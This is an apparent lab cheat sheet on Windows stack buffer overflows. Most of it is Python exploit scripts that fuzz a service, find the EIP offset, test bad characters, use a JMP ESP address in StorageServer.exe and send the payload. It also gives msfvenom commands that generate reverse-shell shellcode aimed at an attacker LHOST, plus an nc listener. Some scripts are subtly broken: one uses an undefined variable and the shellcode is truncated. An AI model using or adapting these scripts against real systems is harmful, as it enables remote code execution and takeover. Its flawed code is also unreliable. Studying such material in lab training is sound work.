# Buffer Overflow

### Windows Immunity Debugger

#### 0-fuzz.py

{% code overflow="wrap" %}
```
#!/usr/bin/python3
import socket
import time
import sys

# msf-pattern_create -l 5000 > inputbuffer
# msf-pattern_offset -l 5000 -q {hang EIP addr} 

try:
  print("\nSending buffer with %s bytes" % (size))
  inputbuffer = b""
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("127.0.0.1", 2233))
  s.send(inputbuffer)
  s.close()
  
  # f = open ("exploit.txt", "wb")
  # f.write(inputbuffer+shellcode)
  # f.close()

except Exception as e: print(e)

```
{% endcode %}

#### 1-eip.py

{% code overflow="wrap" %}
```
#!/usr/bin/python3
import socket
import time
import sys


try:
  filler = b"\x41" * 2306 # msf-pattern_offset -l 5000 -q {hang EIP addr} -> Exact match at offset 2306
  eip = b"\x42" * 4 
  offset = b"\x43" * 16
  nops = b"\x90" * 16
  inputbuffer = filler + eip + offset + nops
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("127.0.0.1", 2233))
  s.send(inputbuffer)
  s.close()
  
  # f = open ("exploit.txt", "wb")
  # f.write(inputbuffer+shellcode)
  # f.close()
  
except Exception as e: print(e)

```
{% endcode %}

#### 2-badchar.py

```
#!/usr/bin/python3
import socket
import time
import sys

# ESP follow in dump find /x00
try:
  filler = b"\x41" * 2306
  eip = b"\x42" * 4 
  offset = b"\x43" * 16
  nops = b"\x90" * 16
  inputbuffer = filler + eip + offset + nops
  
  # list: \x00
  badchars = b""
  badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("127.0.0.1", 2233))
  s.send(inputbuffer+badchars)
  s.close()
  
  # f = open ("exploit.txt", "wb")
  # f.write(inputbuffer+shellcode)
  # f.close()
  
except Exception as e: print(e)

# \x00 bad char by default
# badchars = b""
# badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
# badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
# badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
# badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
# badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
# badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
# badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
# badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
# badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
# badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
# badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
# badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
# badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
# badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
# badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
# badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

```

#### 3-jmp.py

{% hint style="info" %}
!mona modules (to find suitable candadate base addr w/o the badchars)&#x20;

!mona find -s \xff\xe4 -m {candadate} (JMP ESP addr of the candadate)

&#x20;e.g. StorageServer.exe&#x20;

1120110D |. FFE4 JMP ESP
{% endhint %}

```
#!/usr/bin/python3
import socket
import time
import sys

# breakpoint at eip to check, check space size after jump to fit shellcode
try:
  filler = b"\x41" * 2306 
  eip = b"\x0D\x11\x20\x11" # jmp esp addr (esp>eip) found, in reverse
  # eip = b"\x11\x20\x11\x0D"[::-1]
  offset = b"\x43" * 16
  nops = b"\x90" * 16
  inputbuffer = filler + eip + offset + nops
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("127.0.0.1", 2233))
  s.send(inputbuffer)
  s.close()
  
  # f = open ("exploit.txt", "wb")
  # f.write(inputbuffer+shellcode)
  # f.close()

except Exception as e: print(e)

```

#### 4-exploit.py

{% hint style="info" %}
(python exploit.py; cat) | {vulnapp}
{% endhint %}

```
nc -nlvp 4444
```

{% code overflow="wrap" %}
```
#!/usr/bin/python3
import socket
import time
import sys

# breakpoint at eip to check
try:
  filler = b"\x41" * 2306 
  eip = b"\x0D\x11\x20\x11" 
  # eip = b"\x11\x20\x11\x0D"[::-1]
  offset = b"\x43" * 16
  nops = b"\x90" * 16
  inputbuffer = filler + eip + offset + nops
  # -b "\xbadchars"
  #msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.140 LPORT=443 -f py -v shellcode -b ""
  #msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.129 LPORT=443 EXITFUNC=thread -f py -v shellcode -b ""
  shellcode =  b""
  shellcode += b"\x27\xb7\x03\xfe\x38\x52\x23\xad\x39\x77"

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("127.0.0.1", 2233)) # to target machine, port
  s.send(inputbuffer+shellcode)
  s.close()
  
  # f = open ("exploit.txt", "wb")
  # f.write(inputbuffer+shellcode)
  # f.close()

except Exception as e: print(e)

```
{% endcode %}
